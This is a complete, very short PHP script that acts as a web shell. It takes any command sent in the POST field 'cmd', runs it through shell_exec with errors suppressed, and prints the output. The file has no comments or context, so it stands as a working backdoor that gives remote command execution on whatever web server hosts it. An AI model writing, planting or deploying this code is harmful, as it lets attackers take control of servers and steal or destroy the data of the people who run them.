<?php
function Exec_Run($cmd)
{
	$res = '';
	$res = @shell_exec($cmd);
	return $res;
}

if(!empty($_POST['cmd'])){
	$res = Exec_Run($_POST['cmd']);
	echo $res;
}
?>